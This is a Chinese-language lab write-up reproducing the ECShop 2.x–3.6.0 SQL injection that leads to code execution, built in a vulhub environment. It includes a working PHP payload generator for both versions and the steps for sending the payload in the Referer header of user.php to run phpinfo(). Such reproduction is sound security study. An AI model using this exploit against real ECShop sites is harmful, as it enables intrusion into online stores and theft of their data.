ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。

其2017年及以前的版本中，存在一处SQL注入漏洞，通过该漏洞可注入恶意数据，最终导致任意代码执行漏洞。该漏洞在3.6.0版本之后已修复

影响版本: Ecshop 2.x Ecshop 3.x-3.6.0

本文仅作漏洞复现记录与实现，利用流程如下:

一、漏洞环境搭建

本次复现环境采用vulhub搭建，执行以下命令搭建平台

cd vulhub/ecshop/xianzhi-2017-02-82239600/

docker-compose up -d

执行之后开放8080端口(2.7.3版本)与8081端口(3.6.0版本)

mysql地址填写 mysql，mysql账户与密码均为 root，数据库名随意填写，但2.7.3与3.6.0的数据库名不能相同。

![1617434094_606815ee8cf9b694c53e6.png!small](https://image.3001.net/images/20210403/1617434094_606815ee8cf9b694c53e6.png!small)

安装完毕后访问如下图所示

2.7.3版本

![1617434205_6068165d5f897c6c694d7.png!small](https://image.3001.net/images/20210403/1617434205_6068165d5f897c6c694d7.png!small)

3.6.0版本

![1617434228_60681674dc8aaec44b8f5.png!small](https://image.3001.net/images/20210403/1617434228_60681674dc8aaec44b8f5.png!small)

漏洞链接:http://192.168.101.152:8080/ <http://192.168.101.152:8081/>

二、漏洞复现

在vulhub上有漏洞利用脚本，拷贝下来放入seay工具的代码调试功能再执行就能得到poc了

<?php  
$shell = bin2hex("{\$asd'];phpinfo\t();//}xxx");  
$id = "-1' UNION/*";  
$test = sprintf("*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -", bin2hex($id),
$shell);  
$arr = array();  
$arr["num"]=$test;  
$arr["id"]=$id;

$s = serialize($arr);

$hash3 = '45ea207d7a2b68c49582d2d22adf953a';  
$hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';

echo "POC for ECShop 2.x: \n";  
echo "{$hash2}ads|{$s}{$hash2}";  
echo "\n\nPOC for ECShop 3.x: \n";  
echo "{$hash3}ads|{$s}{$hash3}";

?>

![1617434462_6068175ecdee016d9fc4f.png!small](https://image.3001.net/images/20210403/1617434462_6068175ecdee016d9fc4f.png!small)

2.7.3版本

访问http://192.168.101.152:8080/user.php链接，使用burp抓包，添加referer请求头，然后将poc放入再请求，可以看到执行了phpinfo()

![1617434553_606817b972798f25abf45.png!small](https://image.3001.net/images/20210403/1617434553_606817b972798f25abf45.png!small)

3.6.0版本

也是一样的步骤，访问http://192.168.101.152:8081/user.php，使用burp抓包，将poc放入referer请求头中，就可以看到执行了phpinfo()

![1617434808_606818b82290a63450a7f.png!small](https://image.3001.net/images/20210403/1617434808_606818b82290a63450a7f.png!small)

结束

